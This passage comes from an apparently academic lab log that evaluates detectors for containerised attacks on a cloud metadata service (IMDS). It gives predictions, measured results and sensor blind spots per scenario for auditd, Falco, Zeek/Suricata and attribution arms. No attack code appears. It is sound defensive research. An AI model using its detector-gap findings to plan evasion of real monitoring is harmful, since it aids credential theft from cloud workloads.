known image: 2 alerts (first edge + first procflow); new image: + its startup
chain (~18); first-ever semantics never age out (each new workload re-alerts on
its distinct new edges). Static-map aftermath: after any address change, the
static arm alerts on all standing traffic until the map is edited (measured: 2
FPs per window for the rest of the session). The age-out decision itself
belongs to D12's owner with these numbers.

**S0.** K1′ as registered: **FAIL** — (a) 0 SYN-bearing Zeek records without a
probe connect; (b) 0 probe connects without a SYN record; 0 duplicates; but 6
responder-only orphans. All six RSTs (21:30:05–21:30:40) answer SYNs from
[21:28:39, 21:29:21] — the poller's connects between its start and the probe's
first event; all six satisfy RST_ts < probe_start + 84 s. Third consecutive
failure of the same class: sensor-interval bookkeeping at sensor start, never
probe completeness (0 missed, 0 spurious, 0 duplicates in three sessions
wherever both sensors ran). **K1″ registered (decided on the next session):**
as K1′, with the orphan clause bounded — *responder-only orphans with
RST_ts ≥ probe_start + 84 s must be 0* (the probe must have been running at
their SYN time). K2: PASS 7/9 windows; the two misses are the designed
divergence phenomena (churn: pre-swap stratum; 1s: the sidecar connecting from
the shared address) — criterion scope, not probe defects; each miss is a
connect whose cg differs from the IP-map attribution, i.e. the phenomenon the
rounds exist to produce. K3: PASS (churn attack tuple cg = tj-victim, comm =
curl; poller tuples cg = tj-imds-poller; sidecar tuple cg = tj-svictim).

Annotation: the net arm "separates" on churn via `sconn=172.17.0.2→IMDS:80` —
the *new poller's standing background tuple*, absent from B only because
Suricata writes unanswered-flow records ~60–84 s late and B was collected
before its records existed (the §2.5 constraint; not a separator claim).

### Amendments and predictions — session r4: churn re-run and boot-inclusive learning (registered 2026-10-20, before the session)

Scope decision: of the four r3 artifact annotations, **d (pre-reassignment traffic
inside B's window) and f (unlearned startup chains) are re-run**; a (the sidecar
deployment's argv separation) and c (flow-sensor write lag on the reassignment
net cell) stay as recorded annotations.

**Amendments.**
1. **Probe before container creation** (extends 2026-10-16c): the probe starts
   before `setup-listener.sh`/`setup-imds-poller.sh` and before the capture. No
   pre-probe SYNs can exist, so K1″'s orphan clause is expected to hold trivially,
   and the estate's container boots are captured by the probe.
2. **Boot-inclusive learning window:** the learning window's `t0` is taken before
   the estate setup, so the frozen store learns the images' startup chains. The
   credential agent deploys as `nginx sh -c "while …"` — the same image and
   command form as the benign-change workload — so the exact startup keys that
   produced the r3 artifact (entrypoint scripts, `sh` PATH-search attempts) are
   learned benign.
3. **One store for the whole table:** the r4 frozen store replaces the r3 store;
   every cell — including re-scores of existing windows (r2a/r2b five pairs and
   r3's `1s`/`1p`/`bc`/`churn` windows) — is scored against it.
4. **Ordering:** `bc` runs before the reassignment (the static map is correct for
   it); the reassignment is the session's last round, so its aftermath affects no
   later window.

**Predictions.**

| Item | Prediction |
|---|---|
| fpcheck | 0 / 0 / 0 |
| bc (the artifact-f test) | steady state: static 1 (new workload's unmapped-address edge), live 1 (`tj-health>tj-listener:80`), **system 2** (P-edge + P-procflow). The five r3 startup P-exec alerts must not fire (their keys learned from the agent's boot); if any still fires, recorded as measured |
| churn pair (the artifact-d test; original r3 prediction, now cleanly testable) | B contains no pre-reassignment traffic. static: fires on B (misattributed twin edge + misattributed agent background) and raises no alert for the attack connection itself (FN); live: 0 on B, alerts `tj-victim>IMDS` on A (separates); system: 0 on B, alerts P-edge + P-procflow on A (separates) |
| S0 | K1″ PASS with **0 orphans**; K2 PASS (no layout change inside any window except the churn pair, post-amendment); K3 unchanged |
| re-scores vs the new store | verdicts unchanged from the r3 re-scores: S1/S1v/pivot — all arms fire; S2 — ip arms silent, system fires P-procflow + P-exec `base64`; S3 — all silent; r3-`1s` window — system fires P-edge `tj-svictim>IMDS` (+ P-procflow) and the 17 startup P-exec firings of r3 disappear (entrypoint keys now learned); r3-`1p` — all silent |
| auditd / Falco / net cells | not re-measured (no new windows except the re-run rounds) |

### Results — session r4: churn re-run and boot-inclusive learning (recorded 2026-10-20, after the run; evidence `evidence/r4/`)

Session 16:48–16:58 UTC, fresh rollback, probe started **before container
creation** (2 260 lines, 0 non-JSON). Boot-inclusive learning window
16:48:20–16:52:07 (t0 precedes setup); frozen store v2: ipstatic/iplive 2 edges;
join 32 keys — the nginx entrypoint chain (entrypoint scripts, PATH-search `sh`
attempts, awk/basename/md5sum/…) and the agent's `sh -c` boot form are all
learned benign.

| Prediction | Outcome |
|---|---|
| **S0 / K1″** | **PASS — S0 is GO.** (a) 0, (b) 0, 0 duplicates, **0 orphans** (the session check prints the K1′ label; with 0 orphans it satisfies K1″ a fortiori). With the probe preceding all container creation, no pre-probe SYNs exist. K2 PASS 4/4 capture-window rounds (the learning window has no Zeek log by design — capture starts after it). Session-level: 103 Zeek SYN records ↔ 168 probe connects (the surplus are learning-window connects, before capture start, correctly excluded by the (b) bound); every SYN-bearing record matched. Cumulative S0 record across four sessions: **0 missed, 0 spurious, 0 duplicate connects** wherever both sensors ran |
| fpcheck | ✓ 0 / 0 / 0 |
| **bc (artifact-f test)** | ✓ **static 1** (`172.17.0.5>tj-listener:80`, the unmapped new address), **live 1** (`tj-health>tj-listener:80`), **system 2** (P-edge + P-procflow). The five r3 startup P-exec alerts did not fire — the artifact is fixed by measurement, not annotation: steady-state cost per deployment of a known image is 2 |
| **churn pair (artifact-d test)** | ✓ original prediction, cleanly: auditd does not separate (argv-matched); Falco 0; **net does not separate** (the poller tuple is background in both windows — r3's Suricata write-lag artifact did not recur, so artifact c also disappears); **static fires on both windows** (misattributed twin edge `tj-imds-poller>tj-listener:80` + misattributed background `tj-victim>IMDS`) **and raises no alert for the attack connection** (FN); **live separates** (`tj-victim>IMDS`, 0 false keys); **system separates** (P-edge + P-procflow). The only A-only datapoint in all three arms is the attack's own |
| re-scores vs store v2 | ✓ all confirmed: S1/S1v/pivot — all arms fire; S2 — ip arms silent, system fires P-procflow + P-exec `base64`; S3 — all silent; r3-`1s` pair — system fires exactly the two designed cells (`svictim>IMDS` P-edge + P-procflow; the 17 startup firings of r3 disappear), iplive silent, verdict unchanged; r3-`1p` pair — all six arms silent (blind-both) |

**Prediction deviation, recorded:** the churn-benign window was predicted "0
alerts" for live/system; measured, both fire the `tj-health` keys. Cause: the
benign-change workload **keeps running after its round**, and under the frozen
store its first-ever edge re-fires in **every subsequent window that contains
it** (churn-benign and churn both contain `tj-health>tj-listener:80`). The
churn-attribution cells are unaffected (the `tj-health` keys fire on both
windows; the attack's datapoint is the only novel one). This is a measured
refinement of the deployment cost, not a defect: *first-ever facts re-alert on
every observation until the baseline is refreshed or the fact ages out* — the
D12 decision now has both numbers: 2 alerts per deployment, recurring each
window until re-learn.

**Net effect on the thesis table:** footnotes c, d, e and f are resolved by
measurement (deleted); a (the sidecar deployment's argv separation of auditd)
and b (the static map's fires-on-both behavior) remain as annotated.

Superseded expectation, kept for the record: the original guess that scenario 1 would be `covered-host-only` via a default Falco IMDS rule was **falsified** on 2026-09-25 — the deployed stable ruleset contains no IMDS rule, and the link-local flow *does* traverse `docker0`. Execution plan and decision log: [`CHECKPOINT.md`](../CHECKPOINT.md).

---

## Part E — Scope guard and upgrade path

**What this v0 is NOT** (do not gold-plate): not testbed-as-code (no pinned kernel/images, no `make lab-up`), no GUID label markers, no CI, no scaled benign corpus. Those are `2026-plan.md` §3 stages 1–5 and §6 — they consume this rig's outputs, not replace them.

**Upgrade path (each step = one §3 stage):**

| Step | Replaces | Keyed to |
|---|---|---|
| VM + manual scripts | — | this doc (week 1) |
| kind cluster, versions pinned, scenarios as YAML manifests | docker-run scripts | §3 stage 1–2 |
| `make lab-up` one-command rebuild | manual setup | §3 stage 1 |
| GUID marker harness (marker binary + marker hostname) | `date -u` echoes | §3 stage 3 |
| CI smoke (eBPF build + one scenario) | manual re-runs | repo strategy, CI from week 3 |

**Deliverables of the increment** (check against `2026-plan.md:199`): one VM ✓, two-to-three atomics ✓, auditd + one eBPF sensor (Falco; Tetragon in v1) ✓, marker mechanism (timestamps; GUID in v1) ✓, label-join script — minimal version: an `awk`/`jq` pass that extracts each scenario's events from all five logs into one per-scenario evidence file, keyed by the timestamp window. That file is the first labeled LOTL trace.
